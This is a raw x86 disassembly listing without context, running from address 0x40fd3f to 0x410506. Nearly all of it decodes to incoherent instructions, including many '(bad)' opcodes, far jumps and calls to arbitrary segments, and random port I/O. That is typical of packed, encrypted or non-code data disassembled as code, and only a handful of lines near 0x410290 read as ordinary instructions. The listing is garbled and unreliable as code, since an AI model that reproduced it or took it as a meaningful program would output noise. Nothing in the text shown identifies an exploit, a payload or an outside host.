  40fd3f:	out    dx,al
  40fd40:	mov    dh,0x97
  40fd42:	out    0x9a,al
  40fd44:	cmp    BYTE PTR [edx+edx*1],al
  40fd47:	or     al,ah
  40fd49:	xor    edi,ecx
  40fd4b:	jbe    0x40fd14
  40fd4d:	inc    ebx
  40fd4e:	push   es
  40fd4f:	cmp    DWORD PTR [ecx],ebp
  40fd51:	dec    ebp
  40fd52:	push   0x65
  40fd54:	ret    
  40fd55:	inc    ecx
  40fd56:	xchg   ebp,eax
  40fd57:	es mov ch,BYTE PTR ds:[esi]
  40fd5b:	xor    ebp,DWORD PTR [ebx-0x22]
  40fd5e:	stos   BYTE PTR es:[edi],al
  40fd5f:	sar    DWORD PTR [edi+0x7589c259],1
  40fd65:	pop    ss
  40fd66:	(bad)  
  40fd67:	int    0xad
  40fd69:	call   0xd1a1:0x7db56dca
  40fd70:	push   edi
  40fd71:	push   eax
  40fd72:	cmp    bl,dl
  40fd74:	xor    eax,0x154abba2
  40fd79:	xchg   edx,eax
  40fd7a:	test   BYTE PTR [ebx+0x35],cl
  40fd7d:	mov    dl,BYTE PTR [edx+0xb]
  40fd80:	inc    eax
  40fd81:	mov    dh,0x7a
  40fd83:	mov    esp,0x37fb66af
  40fd88:	dec    ebx
  40fd89:	adc    al,0xb4
  40fd8b:	mov    bl,0x68
  40fd8d:	in     eax,0x8
  40fd8f:	or     BYTE PTR [ebp+esi*4-0x5039c294],bl
  40fd96:	rcr    DWORD PTR [esi],0xab
  40fd99:	pusha  
  40fd9a:	in     eax,dx
  40fd9b:	popf   
  40fd9c:	or     al,0xbd
  40fd9e:	popf   
  40fd9f:	das    
  40fda0:	(bad)  
  40fda1:	(bad)  [ecx]
  40fda3:	(bad)  
  40fda4:	lahf   
  40fda5:	pop    ebp
  40fda6:	idiv   edi
  40fda8:	sbb    al,0x44
  40fdaa:	shl    ecx,0xe4
  40fdad:	mov    eax,0x487aaef6
  40fdb2:	pop    edx
  40fdb3:	xchg   ebp,eax
  40fdb4:	xchg   ebx,eax
  40fdb5:	push   ds
  40fdb6:	sub    eax,0x629b2290
  40fdbb:	and    eax,0x33e18f7
  40fdc0:	(bad)  
  40fdc2:	fwait
  40fdc3:	scas   eax,DWORD PTR es:[edi]
  40fdc4:	mov    esp,0xc586b10a
  40fdc9:	arpl   WORD PTR [ebx],si
  40fdcb:	lea    edx,[eax]
  40fdcd:	mov    esi,0xe160169b
  40fdd2:	jns    0x40fda7
  40fdd4:	or     dh,BYTE PTR [ebx]
  40fdd6:	adc    BYTE PTR [ebp-0x732cd0ad],dl
  40fddc:	shl    BYTE PTR [eax-0x644be535],1
  40fde2:	sub    BYTE PTR [esi-0xe],bl
  40fde5:	jmp    0xdbbb6352
  40fdea:	mov    ebp,0x9894c9ec
  40fdef:	mov    DWORD PTR [ebx+ebx*2+0x6047b545],esi
  40fdf6:	adc    ecx,DWORD PTR [eax+0x247a720a]
  40fdfc:	inc    eax
  40fdfd:	jno    0x40fda8
  40fdff:	ret    0x6106
  40fe02:	or     eax,0xff1b5562
  40fe07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe08:	jmp    0x89b49889
  40fe0d:	fisub  DWORD PTR [edi]
  40fe0f:	ffree  st(1)
  40fe11:	xlat   BYTE PTR ds:[ebx]
  40fe12:	fist   WORD PTR [esi]
  40fe14:	lahf   
  40fe15:	int    0x6b
  40fe17:	lds    eax,FWORD PTR [edi-0x384158cd]
  40fe1d:	push   ebp
  40fe1e:	cmp    al,0x56
  40fe20:	arpl   WORD PTR [esp],cx
  40fe23:	dec    esp
  40fe24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe25:	add    ebx,DWORD PTR [edx-0x2bad2a6c]
  40fe2b:	out    dx,eax
  40fe2c:	fstp   DWORD PTR [esi-0x7299666]
  40fe32:	loopne 0x40fe3a
  40fe34:	push   eax
  40fe35:	inc    esi
  40fe36:	pop    ebx
  40fe37:	sbb    eax,0x4075b03c
  40fe3c:	pusha  
  40fe3d:	or     al,0x7e
  40fe3f:	repnz adc eax,DWORD PTR [ebx]
  40fe42:	sbb    ebp,DWORD PTR [eax-0xd7f6b56]
  40fe48:	jbe    0x40fe71
  40fe4a:	sub    eax,0xebb4c1e6
  40fe4f:	call   0x7287:0x576f25ef
  40fe56:	mov    al,ds:0xb09638e5
  40fe5b:	lds    eax,FWORD PTR [edi+0x3adf410e]
  40fe61:	das    
  40fe62:	or     eax,0xd30c0c72
  40fe67:	and    DWORD PTR [edi],0xffffffec
  40fe6a:	pop    ds
  40fe6b:	jmp    0x6044:0x1fe412d4
  40fe72:	dec    esp
  40fe73:	(bad)  
  40fe75:	or     eax,0x5b0e5f8a
  40fe7a:	jb     0x40fed4
  40fe7c:	xchg   esi,eax
  40fe7d:	cmp    BYTE PTR [edx],bh
  40fe7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe80:	add    BYTE PTR [edx-0x36e5af13],0xf9
  40fe87:	inc    edx
  40fe88:	rcr    cl,0x9a
  40fe8b:	push   eax
  40fe8c:	mov    bl,0x9
  40fe8e:	xchg   BYTE PTR [ecx],cl
  40fe90:	inc    ebx
  40fe91:	xchg   ebp,eax
  40fe92:	cmp    DWORD PTR [esi-0x4c21c6ce],edi
  40fe98:	add    al,0xbd
  40fe9a:	test   BYTE PTR [edx+0x33aa865b],bl
  40fea0:	in     eax,0x3e
  40fea2:	gs mov edx,0x35bf8302
  40fea8:	and    esi,DWORD PTR [ecx+0x1b9d037d]
  40feae:	repz lds esi,FWORD PTR [eax+0x2e50a78c]
  40feb5:	lahf   
  40feb6:	mov    edi,0xa8a83963
  40febb:	add    al,0xc
  40febd:	and    DWORD PTR [ecx+0x1e02e6e6],esp
  40fec3:	sbb    eax,DWORD PTR fs:[edx-0x27]
  40fec7:	mov    ah,0xfa
  40fec9:	retf   
  40feca:	sub    ebx,DWORD PTR ds:0x7154e6a4
  40fed0:	scas   al,BYTE PTR es:[edi]
  40fed1:	(bad)  
  40fed2:	ja     0x40fef8
  40fed4:	mov    bl,0x46
  40fed6:	lock aam 0x5e
  40fed9:	push   cs
  40feda:	cmp    BYTE PTR [edx+0x92c0b45],dh
  40fee0:	(bad)  
  40fee1:	aaa    
  40fee2:	jle    0x40ff05
  40fee4:	jb     0x40fed8
  40fee6:	pop    ds
  40fee7:	sub    DWORD PTR [ecx],eax
  40fee9:	push   es
  40feea:	pop    edi
  40feeb:	dec    esi
  40feec:	cdq    
  40feed:	pusha  
  40feee:	add    eax,0x24795ea9
  40fef3:	std    
  40fef4:	push   0xae69831f
  40fef9:	ja     0x40ff7a
  40fefb:	test   eax,0x5751853d
  40ff00:	xor    eax,0xfba23fe5
  40ff05:	dec    esi
  40ff06:	adc    DWORD PTR [esp+eiz*8],ebp
  40ff09:	cwde   
  40ff0a:	cmp    al,0x7f
  40ff0c:	enter  0xb10,0x51
  40ff10:	mov    dh,0x7b
  40ff12:	rcr    DWORD PTR ds:0xcc0d8780,cl
  40ff18:	fild   QWORD PTR [esi]
  40ff1a:	(bad)  
  40ff1b:	mov    ebp,0x19a3a827
  40ff20:	ins    BYTE PTR es:[edi],dx
  40ff21:	sbb    al,0xb6
  40ff23:	fwait
  40ff24:	not    DWORD PTR [edi]
  40ff26:	add    dh,BYTE PTR [eax+0x3a]
  40ff29:	es jmp 0x40ff59
  40ff2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff2d:	sub    ebx,DWORD PTR [ebp-0x31]
  40ff30:	or     DWORD PTR [esi],ebx
  40ff32:	or     eax,ebx
  40ff34:	bound  esi,QWORD PTR [ecx-0x20]
  40ff37:	ins    DWORD PTR es:[edi],dx
  40ff38:	xchg   esp,eax
  40ff39:	mov    ch,0x22
  40ff3b:	xchg   esp,eax
  40ff3c:	pop    ecx
  40ff3d:	or     DWORD PTR [ecx-0x49],edi
  40ff40:	sbb    eax,0x1d56bfa7
  40ff45:	lea    ebp,[esi+0x74095e]
  40ff4b:	cli    
  40ff4c:	and    cl,bl
  40ff4e:	and    BYTE PTR [ebx+ecx*1-0x5c8c6f05],ah
  40ff55:	or     dh,BYTE PTR [ebx+esi*8+0x70]
  40ff59:	je     0x40fef6
  40ff5b:	pusha  
  40ff5c:	add    al,0x5a
  40ff5e:	push   esi
  40ff5f:	dec    esp
  40ff60:	dec    DWORD PTR [esi+eiz*1]
  40ff63:	sub    BYTE PTR [ecx-0x56],dh
  40ff66:	call   0x2ef4:0x1dc2e39a
  40ff6d:	mov    eax,ds:0x9e2e093e
  40ff72:	rcr    dh,0x2e
  40ff75:	out    dx,eax
  40ff76:	jae    0x40ffa2
  40ff78:	xchg   edi,eax
  40ff79:	mov    al,0x5f
  40ff7b:	adc    eax,0xe280857b
  40ff80:	fsub   st,st(7)
  40ff82:	mov    dh,0x5d
  40ff84:	push   edi
  40ff85:	int3   
  40ff86:	jge    0x410003
  40ff88:	push   eax
  40ff89:	push   0x77
  40ff8b:	out    dx,eax
  40ff8c:	jb     0x40ff32
  40ff8e:	retf   0x1a7
  40ff91:	add    al,0x9
  40ff93:	dec    edx
  40ff94:	sar    BYTE PTR ds:0x614cfe01,0x7c
  40ff9b:	cmp    ebp,DWORD PTR [esi+0x70]
  40ff9e:	aas    
  40ff9f:	(bad)  
  40ffa0:	aam    0x8f
  40ffa2:	cmp    eax,0xf4115a0e
  40ffa7:	mov    esi,DWORD PTR [ecx]
  40ffa9:	ss iret 
  40ffab:	stc    
  40ffac:	out    dx,eax
  40ffad:	imul   ebp,DWORD PTR [eax+ebp*8+0x26201048],0xffffffff
  40ffb5:	adc    eax,0x4c1fc677
  40ffba:	add    DWORD PTR [esi],ebp
  40ffbc:	xor    bh,dh
  40ffbe:	dec    BYTE PTR [eax+esi*2-0x75]
  40ffc2:	cs out 0x99,eax
  40ffc5:	fsub   DWORD PTR [ebx-0x2d747f60]
  40ffcb:	jge    0x410030
  40ffcd:	dec    edi
  40ffce:	arpl   cx,dx
  40ffd0:	mov    ecx,0x539dc29d
  40ffd5:	sub    al,0xa
  40ffd7:	(bad)  
  40ffd8:	sbb    DWORD PTR [esi+0x56086ff2],edi
  40ffde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffdf:	lea    esi,[ebp-0x56e379cc]
  40ffe5:	outs   dx,BYTE PTR ds:[esi]
  40ffe6:	aaa    
  40ffe7:	mov    cl,0x78
  40ffe9:	jecxz  0x40ffa1
  40ffeb:	mov    bl,0xa9
  40ffed:	push   ss
  40ffee:	jmp    0x410014
  40fff0:	push   ds
  40fff1:	jne    0x40ffbe
  40fff3:	adc    al,0x1e
  40fff5:	push   ds
  40fff6:	stc    
  40fff7:	xor    eax,0xbdd52abc
  40fffc:	jo     0x41003c
  40fffe:	push   0x6811fc8e
  410003:	or     eax,0x7798b0a
  410008:	stos   DWORD PTR es:[edi],eax
  410009:	outs   dx,DWORD PTR ds:[esi]
  41000a:	xchg   ebx,eax
  41000b:	jp     0x410002
  41000d:	rcr    DWORD PTR [edi-0x728bdff0],1
  410013:	in     eax,dx
  410014:	push   esp
  410015:	xchg   esp,eax
  410016:	in     eax,dx
  410017:	fadd   st(0),st
  410019:	(bad)  
  41001a:	cdq    
  41001b:	stc    
  41001c:	jnp    0x40ffd1
  41001e:	mov    ds:0xee6ba7d2,al
  410023:	dec    esp
  410024:	out    0x45,eax
  410026:	mov    DWORD PTR [ecx],esp
  410028:	jo     0x41000b
  41002a:	or     al,0x9f
  41002c:	cwde   
  41002d:	int    0x45
  41002f:	in     al,0xa1
  410031:	ss (bad) 
  410033:	and    dh,BYTE PTR [eax]
  410035:	push   cs
  410036:	outs   dx,DWORD PTR ds:[esi]
  410037:	xor    al,BYTE PTR [esi]
  410039:	imul   edx,ecx,0x2e05ab82
  41003f:	mov    bl,0xed
  410041:	ret    0xda
  410044:	mov    edi,0x74a40fd1
  410049:	into   
  41004a:	jbe    0x4100be
  41004c:	jb     0x4100c5
  41004e:	adc    eax,0xe484a3d2
  410053:	je     0x410053
  410055:	out    0xab,al
  410057:	fsub   DWORD PTR [ebp-0x2c]
  41005a:	mov    eax,0xace414f6
  41005f:	call   0x83b4:0x37853213
  410066:	xchg   edx,eax
  410067:	cld    
  410068:	cs loop 0x410099
  41006b:	ror    DWORD PTR [esi-0x5f],1
  41006e:	stos   BYTE PTR es:[edi],al
  41006f:	push   ecx
  410070:	jp     0x4100e2
  410072:	jecxz  0x41003c
  410074:	xor    DWORD PTR [eax+0x5fa81373],edx
  41007a:	xchg   esp,eax
  41007b:	sub    DWORD PTR [eax],0x33
  41007e:	mov    ch,0xc6
  410080:	test   DWORD PTR [esi+0x76e932d2],esi
  410086:	pop    ecx
  410087:	retf   0x239c
  41008a:	daa    
  41008b:	jl     0x4100a2
  41008d:	pop    esi
  41008e:	cld    
  41008f:	repnz xchg ecx,eax
  410091:	sar    DWORD PTR ds:0x273b7867,cl
  410097:	adc    DWORD PTR [edx-0x2edb86ad],edi
  41009d:	adc    DWORD PTR [esi],0x46078e6e
  4100a3:	pop    ds
  4100a4:	out    0x0,eax
  4100a6:	cmp    ebp,DWORD PTR [esi+0x3671c446]
  4100ac:	add    al,0x50
  4100ae:	and    al,0x6a
  4100b0:	push   cs
  4100b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100b2:	and    eax,0x47a0e9e
  4100b7:	add    edx,DWORD PTR [edi+ebp*1-0x331f6178]
  4100be:	mov    ebx,0xdf116080
  4100c3:	or     eax,0x9deb5990
  4100c8:	push   0x3a8a4fba
  4100cd:	test   al,0x36
  4100cf:	and    eax,0xc6f181a5
  4100d4:	aad    0xf1
  4100d6:	sub    DWORD PTR [eax-0x5f97018c],ebx
  4100dc:	xlat   BYTE PTR ds:[ebx]
  4100dd:	push   cs
  4100de:	addr16 add ebp,edx
  4100e1:	xor    eax,0x583804ae
  4100e6:	ds push ebp
  4100e8:	push   ds
  4100e9:	cs mov bl,0x25
  4100ec:	sti    
  4100ed:	xor    BYTE PTR [ebx-0x78f7fba1],dh
  4100f3:	lods   eax,DWORD PTR ds:[esi]
  4100f4:	xlat   BYTE PTR ds:[ebx]
  4100f5:	dec    eax
  4100f6:	imul   ebx,DWORD PTR [esp+ecx*2-0x39],0xffffffe0
  4100fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100fc:	push   esi
  4100fd:	push   DWORD PTR [edi+edi*2+0x7b4874f2]
  410104:	mov    ah,0xb7
  410106:	in     eax,dx
  410107:	sub    al,0x11
  410109:	or     ch,BYTE PTR [ecx-0x569cf84b]
  41010f:	xor    bl,BYTE PTR [ebp+0x68]
  410112:	mov    WORD PTR [ebp-0x711db74a],cs
  410118:	or     BYTE PTR [ecx+ebp*1-0x446e2a2c],dl
  41011f:	jmp    ecx
  410121:	pushf  
  410122:	or     cl,BYTE PTR [edx+0x59]
  410125:	cmp    al,dl
  410127:	inc    esp
  410128:	in     al,0xfd
  41012a:	dec    ebp
  41012b:	mov    ecx,0x333553a7
  410130:	mov    al,gs:0x33bc4adf
  410136:	sub    ch,BYTE PTR [ebp+0x19fb1e75]
  41013c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41013d:	sub    ebp,DWORD PTR [edi]
  41013f:	push   edx
  410140:	adc    DWORD PTR [edi-0x5b9fd7f9],esi
  410146:	fldcw  WORD PTR [ecx-0x71318b09]
  41014c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014d:	dec    eax
  41014e:	daa    
  41014f:	lahf   
  410150:	mov    ebx,0x39344790
  410155:	push   ss
  410156:	mov    esi,0xd3edca63
  41015b:	mov    esp,0x52ccd1bb
  410160:	mov    gs,WORD PTR [edx+ecx*2]
  410163:	out    0x4e,eax
  410165:	(bad)  
  410166:	mul    DWORD PTR [eax+edi*2-0x311365bf]
  41016d:	xor    DWORD PTR [bp-0x92e],0x1e
  410173:	xor    al,0x8
  410175:	xchg   esp,eax
  410176:	pop    edx
  410177:	sub    ah,BYTE PTR [ebp-0x25]
  41017a:	stc    
  41017b:	std    
  41017c:	gs leave 
  41017e:	retf   
  41017f:	jge    0x4101db
  410181:	mov    BYTE PTR [ebp-0x1b72388a],cl
  410187:	int3   
  410188:	dec    edx
  410189:	out    dx,al
  41018a:	outs   dx,DWORD PTR ds:[esi]
  41018b:	and    eax,0xc8530879
  410190:	add    cl,BYTE PTR [esi-0x4fa8a990]
  410196:	out    dx,eax
  410197:	jo     0x4101f4
  410199:	dec    edi
  41019a:	ret    0xf3c3
  41019d:	push   edi
  41019e:	mov    gs,WORD PTR [ebx+0x7ede8fc8]
  4101a4:	pop    ss
  4101a5:	fwait
  4101a6:	dec    BYTE PTR [edi]
  4101a8:	in     al,dx
  4101a9:	mov    dh,0x50
  4101ab:	int3   
  4101ac:	daa    
  4101ad:	mov    ch,0x91
  4101af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b0:	(bad)  
  4101b1:	clc    
  4101b2:	lds    esi,FWORD PTR [ebp-0x1bc9850]
  4101b8:	js     0x4101fa
  4101ba:	pop    fs
  4101bc:	jg     0x4101f3
  4101be:	jle    0x4101e8
  4101c0:	call   0xfbc64bea
  4101c5:	sub    eax,0xa3cf1644
  4101ca:	mov    ah,0xe
  4101cc:	mov    esp,0xd5213b7
  4101d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101d2:	aad    0x2
  4101d4:	stos   DWORD PTR es:[edi],eax
  4101d5:	ret    0xac8e
  4101d8:	(bad)  
  4101d9:	mov    eax,ds:0x4c62b113
  4101de:	xchg   edx,eax
  4101df:	cmp    al,0x51
  4101e1:	jmp    0x9686cf66
  4101e6:	arpl   WORD PTR [eax+0x42d4e79],bp
  4101ec:	repnz std 
  4101ee:	jno    0x410250
  4101f0:	dec    ebp
  4101f1:	push   eax
  4101f2:	repnz frstpm(287 only) 
  4101f5:	test   al,0x65
  4101f7:	inc    ebp
  4101f8:	into   
  4101f9:	pop    ss
  4101fa:	mov    ebp,0xc57410f9
  4101ff:	mov    cl,0xa6
  410201:	and    al,0x3a
  410203:	push   es
  410204:	jmp    0x98fa333e
  410209:	xor    BYTE PTR [ecx-0x5a339af0],0x80
  410210:	loopne 0x410211
  410212:	pusha  
  410213:	out    0xbc,eax
  410215:	ins    DWORD PTR es:[edi],dx
  410216:	inc    edx
  410217:	call   0x6b09:0x46626245
  41021e:	mov    bl,0x80
  410220:	out    dx,al
  410221:	pop    es
  410222:	outs   dx,BYTE PTR ds:[esi]
  410223:	adc    eax,0x45baab7f
  410228:	mov    dl,0x83
  41022a:	je     0x4101f9
  41022c:	(bad)  fs:[eax]
  41022f:	jecxz  0x410236
  410231:	sub    esp,DWORD PTR [edx+0x47]
  410234:	call   0x15b0:0xa46ad136
  41023b:	ss scas eax,DWORD PTR es:[edi]
  41023d:	(bad)  
  41023e:	ret    0x944f
  410241:	pop    edi
  410242:	pop    edx
  410243:	clc    
  410244:	or     BYTE PTR [ebx],cl
  410246:	arpl   WORD PTR [ebp+0x1e],si
  410249:	mov    BYTE PTR [bp+si+0x45ba],ah
  41024e:	add    esp,DWORD PTR [ecx+0xe]
  410251:	xchg   DWORD PTR [ebp+0x3ed10627],esp
  410257:	pop    ecx
  410258:	test   BYTE PTR [edx-0x57db011b],bh
  41025e:	inc    ebp
  41025f:	mov    esp,0x5483e066
  410264:	pop    esi
  410265:	sub    al,0x32
  410267:	jbe    0x410294
  410269:	dec    ebp
  41026a:	push   cs
  41026b:	adc    al,0x9c
  41026d:	and    BYTE PTR [edx+0x23],dl
  410270:	cmp    DWORD PTR [edi],ecx
  410272:	jmp    0xcd2b1f03
  410277:	test   DWORD PTR [edx+ebx*2-0x11],ebp
  41027b:	xchg   ebx,eax
  41027c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41027d:	stos   BYTE PTR es:[edi],al
  41027e:	daa    
  41027f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410280:	sub    DWORD PTR [edi-0x7472d025],esp
  410286:	ret    0x4539
  410289:	or     al,0xf
  41028b:	test   edx,ecx
  41028d:	push   ss
  41028e:	add    BYTE PTR [eax],al
  410290:	mov    eax,DWORD PTR [esi]
  410292:	mov    edx,DWORD PTR [esi+0x4]
  410295:	mov    eax,DWORD PTR [esi]
  410297:	mov    edx,DWORD PTR [esi+0x4]
  41029a:	mov    edx,eax
  41029c:	jmp    0x410826
  4102a1:	shr    esi,cl
  4102a3:	ror    dh,cl
  4102a5:	shl    BYTE PTR [edx-0x1e636d6d],cl
  4102ab:	loopne 0x410321
  4102ad:	ret    0xcad2
  4102b0:	outs   dx,BYTE PTR ds:[esi]
  4102b1:	inc    edi
  4102b2:	pushw  ss
  4102b4:	push   ss
  4102b5:	cmp    eax,0x2161604
  4102ba:	dec    esi
  4102bb:	aas    
  4102bc:	sub    al,0xd9
  4102be:	aam    0x97
  4102c0:	or     eax,0x65a12584
  4102c5:	jmp    0xafac9eaf
  4102ca:	rol    bh,0x3
  4102cd:	out    0xa0,eax
  4102cf:	pop    eax
  4102d0:	push   edx
  4102d1:	adc    BYTE PTR [edi-0x57691a50],0xfd
  4102d8:	mov    ds:0xe1b27671,al
  4102dd:	pandn  mm6,QWORD PTR [ecx+0x4e009b65]
  4102e4:	adc    DWORD PTR [esi+eax*1],esi
  4102e7:	push   ss
  4102e8:	ret    
  4102e9:	mov    ecx,edx
  4102eb:	jne    0x410308
  4102ed:	jp     0x4102ae
  4102ef:	or     BYTE PTR [edx],al
  4102f1:	out    dx,al
  4102f2:	(bad)  
  4102f3:	sar    BYTE PTR [esp+ecx*8-0x7dc3518],0x2d
  4102fb:	cmp    BYTE PTR [ecx],ah
  4102fd:	jb     0x41036a
  4102ff:	in     al,dx
  410300:	call   0x66dcffa
  410305:	dec    edx
  410306:	mov    ecx,0xc3e86c12
  41030b:	pushf  
  41030c:	imul   edx,DWORD PTR [edi-0x11b02d36],0xffffffa2
  410313:	jno    0x41030e
  410315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410316:	mov    ch,0x9c
  410318:	lods   eax,DWORD PTR ds:[esi]
  410319:	cmp    ch,BYTE PTR [edx-0x59]
  41031c:	fsub   DWORD PTR [eax-0x44b65c7e]
  410322:	mov    ah,0x76
  410324:	xchg   esi,eax
  410325:	jmp    0x41037a
  410327:	fild   WORD PTR [eax+esi*4+0x7c8abd0a]
  41032e:	inc    edi
  41032f:	mov    edi,0x11cec94f
  410334:	push   ds
  410335:	sbb    edi,DWORD PTR [eax-0x61afc87b]
  41033b:	aas    
  41033c:	inc    ebp
  41033d:	cmp    eax,0x9cc7b1c2
  410342:	push   esi
  410343:	daa    
  410344:	mov    esi,ebp
  410346:	in     eax,0xad
  410348:	cmp    al,bh
  41034a:	adc    edx,DWORD PTR [esp+eax*1]
  41034d:	xchg   esi,eax
  41034e:	xchg   esi,eax
  41034f:	jnp    0x41036b
  410351:	out    0x83,eax
  410353:	pop    ss
  410354:	das    
  410355:	shr    BYTE PTR [esi-0x6e],1
  410358:	and    DWORD PTR [ebx+ebp*1+0x4],ecx
  41035c:	ret    
  41035d:	dec    eax
  41035e:	daa    
  41035f:	mov    WORD PTR [eax-0x6b63821c],?
  410365:	adc    BYTE PTR [esi+0x53],al
  410368:	icebp  
  410369:	imul   BYTE PTR [ecx]
  41036b:	xchg   esi,eax
  41036c:	jmp    0x2a699899
  410371:	adc    eax,0xa57da9c6
  410376:	and    dl,BYTE PTR [edx]
  410378:	and    eax,0x9aa2a565
  41037d:	(bad)  
  41037e:	test   al,0x58
  410380:	adc    DWORD PTR [edx+ebp*2+0x28c6ba87],eax
  410387:	xor    al,BYTE PTR [ecx+0x62]
  41038a:	jl     0x4103fe
  41038c:	sub    al,0x1e
  41038e:	iret   
  41038f:	jp     0x4103e6
  410391:	xchg   dl,dh
  410393:	ins    DWORD PTR es:[edi],dx
  410394:	push   ecx
  410395:	xchg   esp,eax
  410396:	enter  0x2d5a,0x81
  41039a:	xchg   esi,eax
  41039b:	pop    esp
  41039c:	jg     0x410341
  41039e:	test   eax,0x50b4f312
  4103a4:	inc    ebx
  4103a5:	ds mov ecx,0xfaea1944
  4103ab:	nop
  4103ac:	dec    edi
  4103ad:	and    eax,0xb0f50837
  4103b2:	xor    al,0xf7
  4103b4:	fnsave [eax-0x23]
  4103b7:	inc    ecx
  4103b8:	xchg   BYTE PTR [edi],dh
  4103ba:	hlt    
  4103bb:	push   es
  4103bc:	inc    ebx
  4103bd:	mov    ecx,0x13ff2aeb
  4103c2:	jge    0x410438
  4103c4:	into   
  4103c5:	mov    DWORD PTR [ebx],esp
  4103c7:	sbb    BYTE PTR [ebx-0x42],ah
  4103ca:	mov    BYTE PTR [edi],cl
  4103cc:	pop    edi
  4103cd:	xlat   BYTE PTR ds:[ebx]
  4103ce:	loopne 0x410355
  4103d0:	mov    ebx,0x9ffcef7b
  4103d5:	dec    esp
  4103d6:	pop    ss
  4103d7:	sub    al,0xcd
  4103d9:	gs nop
  4103db:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103de:	in     eax,0x74
  4103e0:	mov    ds:0xe5cc9713,al
  4103e5:	xchg   edx,eax
  4103e6:	mov    ds:0x6dff98c6,al
  4103eb:	(bad)  
  4103ed:	mov    eax,ds:0xbab853d4
  4103f2:	int    0xeb
  4103f4:	pop    ecx
  4103f5:	xor    BYTE PTR [edi+0x3],0xf3
  4103f9:	loopne 0x41040c
  4103fb:	div    al
  4103fd:	xor    DWORD PTR [ebx],ebp
  4103ff:	call   DWORD PTR cs:[ecx]
  410402:	jecxz  0x41044c
  410404:	inc    ebp
  410405:	jns    0x41047b
  410407:	test   bh,bl
  410409:	mov    BYTE PTR [edx+0x67c1fa2e],ah
  41040f:	mov    ds:0x9bfeee72,al
  410414:	lods   eax,DWORD PTR ds:[esi]
  410415:	mov    esi,0xa4b5107b
  41041a:	mov    ch,BYTE PTR [ebx-0x732f66b6]
  410420:	mov    ebp,0x85322817
  410425:	jp     0x410473
  410427:	xor    dh,BYTE PTR [edi+0x48]
  41042a:	stc    
  41042b:	cmp    eax,0xb4417b3e
  410430:	pop    ss
  410431:	push   ecx
  410432:	test   BYTE PTR [ecx],bl
  410434:	popa   
  410435:	(bad)  
  410437:	into   
  410438:	mov    ebx,0xac9f154c
  41043d:	add    eax,0x223d84a6
  410442:	xor    edx,DWORD PTR [ebp+0x25]
  410445:	cmp    al,0x6a
  410447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410448:	sahf   
  410449:	stos   DWORD PTR es:[edi],eax
  41044a:	bound  edi,QWORD PTR [ebx+ebx*2+0x29ab1333]
  410451:	sub    al,0xf1
  410453:	xchg   ebp,eax
  410454:	dec    BYTE PTR [ecx]
  410456:	ret    
  410457:	hlt    
  410458:	or     al,0xda
  41045a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41045b:	push   esp
  41045c:	aad    0x3d
  41045e:	jmp    0x127c:0x5e033835
  410465:	push   es
  410466:	(bad)  
  410467:	cmp    esp,DWORD PTR [ecx-0x7f]
  41046a:	and    bh,BYTE PTR [ebp-0x45c1a290]
  410470:	sub    al,0x18
  410472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410474:	pop    edi
  410475:	and    eax,0xf53b81db
  41047a:	iret   
  41047b:	cli    
  41047c:	sahf   
  41047d:	clc    
  41047e:	cmp    eax,0xd4722080
  410483:	sub    dl,0xe5
  410486:	outs   dx,DWORD PTR ds:[esi]
  410487:	(bad)  
  410489:	pop    ebp
  41048a:	ret    0xd897
  41048d:	lods   eax,DWORD PTR ds:[esi]
  41048e:	int    0x15
  410490:	sbb    DWORD PTR [esi+0x1bb75d52],0xad3cd295
  41049a:	(bad)  
  41049b:	out    dx,al
  41049c:	(bad)  
  41049d:	jbe    0x410456
  41049f:	mov    ebp,0xff389ca5
  4104a4:	fisttp QWORD PTR [edx+0x56]
  4104a7:	aam    0x7f
  4104a9:	mov    ch,0xf1
  4104ab:	xchg   DWORD PTR [edx],edx
  4104ad:	daa    
  4104ae:	sahf   
  4104af:	std    
  4104b0:	sub    BYTE PTR [edx+eax*1-0x11916afc],0x4a
  4104b8:	rcl    DWORD PTR [eax-0x57353596],1
  4104be:	xlat   BYTE PTR ds:[ebx]
  4104bf:	ficom  WORD PTR [eax-0x295bf13c]
  4104c5:	scas   al,BYTE PTR es:[edi]
  4104c6:	inc    edi
  4104c7:	rcl    DWORD PTR [ebp+0x3da6ab02],0x20
  4104ce:	jmp    0x80d:0x1453707
  4104d5:	push   esp
  4104d6:	dec    esi
  4104d7:	push   0xffffff81
  4104d9:	and    eax,0xa13c38cc
  4104de:	lahf   
  4104df:	adc    edx,esi
  4104e1:	nop
  4104e2:	dec    esp
  4104e3:	sti    
  4104e4:	pusha  
  4104e5:	xor    edi,edx
  4104e7:	add    ch,BYTE PTR [esi]
  4104e9:	rcr    BYTE PTR [eax],1
  4104eb:	pop    esp
  4104ec:	scas   eax,DWORD PTR es:[edi]
  4104ed:	mov    bl,0x1e
  4104ef:	mov    dl,0x91
  4104f1:	lahf   
  4104f2:	pop    esi
  4104f3:	stos   BYTE PTR es:[edi],al
  4104f4:	nop
  4104f5:	mov    ecx,0xce985e8
  4104fa:	(bad)  
  4104fb:	popa   
  4104fc:	jge    0x41055e
  4104fe:	jae    0x4104a9
  410500:	pop    edi
  410501:	inc    ebp
  410502:	daa    
  410503:	dec    ebp
  410504:	in     al,0x26
  410506:	fild   QWORD PTR [ebx]
